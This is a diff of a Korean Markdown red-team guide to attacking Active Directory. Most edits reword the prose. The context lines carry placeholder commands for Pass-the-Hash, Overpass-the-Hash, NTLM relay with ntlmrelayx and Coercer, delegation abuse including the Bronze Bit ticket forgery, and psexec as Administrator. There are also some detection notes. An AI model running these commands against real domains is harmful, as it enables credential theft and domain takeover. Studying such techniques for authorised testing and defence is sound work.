@@ -1,8 +1,8 @@
 # AD 환경 공격
 
-AD 가 어떻게 세팅되어 있는지 — Kerberos / NTLM / LDAP Signing 같은 인증 구성 — 에 따라 사용 가능한 공격 기법과 명령어가 달라진다.
+AD 가 어떻게 세팅되어 있는지 — Kerberos / NTLM / LDAP Signing 같은 인증 구성에 따라 사용 가능한 공격 기법과 명령어가 상이하다.
 
-그래서 항상 도메인의 현재 상태를 먼저 파악한 다음 공격 벡터를 정한다.
+그래서 항상 도메인의 현재 상태를 먼저 파악한 다음 공격 벡터를 정해야 한다.
 
 ---
 
@@ -37,7 +37,8 @@ Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibil
 
 ## 인증 방식별 명령어 분기
 
-대부분의 Impacket, nxc 도구는 password / NTLM hash / Kerberos 티켓 세 가지 인증 방식을 지원한다. target 환경에 따라 적절한 방식을 선택한다.
+대부분의 Impacket, nxc 도구는 password / NTLM hash / Kerberos 티켓 세 가지 인증 방식을 지원한다. 
+Target 환경에 따라 적절한 방식을 선택해야 한다.
 
 ### password 인증 (기본)
 
@@ -62,7 +63,7 @@ certipy find -vulnerable -u <user> -p '<pass>' -dc-ip <dc_ip>
 
 ### NTLM Hash 인증 (Pass-the-Hash)
 
-NTLM 인증이 허용된 환경에서만 동작한다. `LmCompatibilityLevel`이 NTLM을 거부하도록 설정된 경우 PtH는 실패한다.
+NTLM 인증이 허용된 환경에서만 동작한다. `LmCompatibilityLevel`이 NTLM을 거부하도록 설정된 경우 PTH는 실패한다.
 
 ```bash
 # Impacket (-hashes LM:NT 형식, LM은 빈 값 가능)
@@ -87,7 +88,7 @@ certipy shadow auto -username <user>@<domain> -hashes <ntlm_hash> -account <targ
 
 ### Kerberos 인증 (Pass-the-Ticket)
 
-NTLM이 비활성화되었거나 Kerberos만 허용하는 환경에서 사용한다. `.ccache` 티켓 파일 필요.
+NTLM이 비활성화되었거나 Kerberos만 허용하는 환경에서 사용한다. `.ccache` 티켓 파일 필요
 
 **사전 조건:**
 
@@ -159,7 +160,7 @@ bloodhound-python -u <user> -d <domain> -dc <dc_fqdn> -c all \
 
 !!! warning "Kerberos 인증 시 주의"
     Kerberos 인증은 반드시 FQDN(호스트 이름)을 사용해야 한다. IP 주소로는 Kerberos 인증이 불가능하다.
-    `-k` 플래그 사용 시 target을 IP가 아닌 FQDN으로 지정할 것.
+    `-k` 플래그 사용 시 target을 IP가 아닌 FQDN으로 지정할 것
 
 ---
 
@@ -183,7 +184,7 @@ bloodhound-python -u <user> -d <domain> -dc <dc_fqdn> -c all \
 
 ### SMB Signing
 
-| 설정 | NTLM Relay | PtH (SMB) | PSExec |
+| 설정 | NTLM Relay | PTH (SMB) | PSExec |
 |------|------------|-----------|--------|
 | Signing 강제 (Required) | X | O | O |
 | Signing 비강제 (Not Required) | O | O | O |
@@ -200,8 +201,8 @@ bloodhound-python -u <user> -d <domain> -dc <dc_fqdn> -c all \
 
 ## Overpass-the-Hash (Pass-the-Key)
 
-NTLM이 비활성화된 환경에서 NTLM hash를 Kerberos TGT로 변환하여 사용하는 기법.
-NTLM hash만 갖고 있지만 NTLM 인증이 차단된 경우에 유용하다.
+NTLM이 비활성화된 환경에서 NTLM hash를 Kerberos TGT로 변환하여 사용하는 방식
+NTLM Hash만 갖고 있지만 NTLM 인증이 차단된 경우에 유용하다.
 
 ```bash
 # NTLM Hash로 TGT 요청 → .ccache 파일 생성
@@ -252,7 +253,7 @@ sequenceDiagram
 
 - target 서비스의 SMB Signing이 비활성화(Not Required)이거나
 - LDAP Signing/Channel Binding이 비강제이거나
-- ADCS HTTP Enrollment Endpoint에 EPA(Extended Protection)가 없는 경우
+- ADCS HTTP Enrollment Endpoint에 EPA(Extended Protection for Authentication)가 없는 경우
 
 ```bash
 # ntlmrelayx (SMB Relay)
@@ -271,7 +272,7 @@ python3 Coercer.py -u <user> -p <pass> -d <domain> -l <attacker_ip> -t <target_i
 ```
 
 !!! warning "탐지"
-    NTLM Relay: Event 4624 (Type 3 로그온) 소스 IP와 대상 호스트 불일치 모니터링. SMB Signing 활성화 및 LDAP Channel Binding 설정으로 예방.
+    NTLM Relay: Event 4624 (Type 3 로그온) 소스 IP와 대상 호스트 불일치 모니터링 / SMB Signing 활성화 및 LDAP Channel Binding 설정으로 예방
 
 ### Relay target 선정
 
@@ -300,7 +301,7 @@ python3 printerbug.py <domain>/<user>:<pass>@<dc_ip> <delegation_server_ip>
 
 ### Constrained Delegation
 
-S4U2Self + S4U2Proxy를 통해 위임된 서비스에 대한 서비스 티켓을 요청한다.
+S4U2Self + S4U2Proxy를 통해 위임된 서비스에 대한 서비스 티켓을 요청하는 방식
 
 ```bash
 # Constrained Delegation 설정 확인
@@ -315,7 +316,7 @@ impacket-psexec <domain>/Administrator@<target_fqdn> -k -no-pass
 ```
 
 !!! tip "Bronze Bit (CVE-2020-17049)"
-    Constrained Delegation에서 `forwardable` 플래그가 불허된 경우에도 티켓을 위조하여 강제로 위임할 수 있다 (2020년 11월 패치).  
+    Constrained Delegation에서 `forwardable` 플래그가 허용되지 않는 경우에도 티켓을 위조하여 강제로 위임할 수 있다 (2020년 11월 패치).  
     `impacket-getST` 에서 `-force-forwardable` 플래그를 추가하면 된다.
 
 ### Resource-Based Constrained Delegation (RBCD)
@@ -344,7 +345,7 @@ impacket-psexec <domain>/Administrator@<target_fqdn> -k -no-pass
     `nxc ldap <dc_ip> -u <user> -p <pass> -M maq`로 확인 가능.
 
 !!! warning "탐지"
-    RBCD: Event 5136 (디렉터리 객체 수정) 에서 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성 변경 감지. 비정상 컴퓨터 계정 생성 (Event 4741) 모니터링.
+    RBCD: Event 5136 (디렉터리 객체 수정) 에서 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성 변경 감지. 비정상 컴퓨터 계정 생성 (Event 4741) 모니터링
 
 ---
 
@@ -386,14 +387,14 @@ Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType
 |------|-----------|-----------|
 | SMB Signing | `nxc smb <ip>` | Relay 가능 여부 |
 | LDAP Signing | `nxc ldap <ip> -M ldap-checker` | LDAP Relay 가능 여부 |
-| NTLM 허용 여부 | `LmCompatibilityLevel` Registry | PtH 가능 여부 |
+| NTLM 허용 여부 | `LmCompatibilityLevel` Registry | PTH 가능 여부 |
 | Kerberos AES 지원 | Domain Functional Level 확인 | OPSEC (AES vs RC4) |
 | MachineAccountQuota | `nxc ldap <ip> -M maq` | RBCD 가능 여부 |
 | ADCS 존재 | `nxc ldap <ip> -M adcs` | ESC1~ESC16 |
 | Credential Guard | `DeviceGuardSecurityServicesConfigured` | lsass dump 불가 |
 | LAPS | `nxc ldap <ip> -M laps` | 로컬 admin PW 관리 여부 |
 | gMSA | `nxc ldap <ip> -M gmsa` | 서비스 계정 PW 읽기 |
-| Protected Users | `net group "Protected Users" /domain` | PtH/위임 공격 불가 |
+| Protected Users | `net group "Protected Users" /domain` | PTH/위임 공격 불가 |
 | AdminSDHolder | SDProp으로 ACL 복원됨 | ACL 공격 지속성 제한 |
 | Print Spooler | `ls \\<target>\pipe\spoolss` | PrinterBug/강제 인증 |
 | WebDAV | `nxc smb <ip> -M webdav` | WebDAV NTLM Relay |
@@ -416,7 +417,9 @@ net group "Protected Users" /domain
 Get-ADGroupMember "Protected Users"
 ```
 
-이 그룹에 속한 계정은 PtH, 위임 공격 등이 불가능하므로 다른 경로를 찾아야 한다.
+이 그룹에 속한 계정은 PTH, 위임 공격 등이 불가능하므로 다른 경로를 찾아야 한다.
+
+그러나 Protected Users에 속한 사용자가 다른 계정에 대한 권한 악용은 가능하다.
 
 ---
 
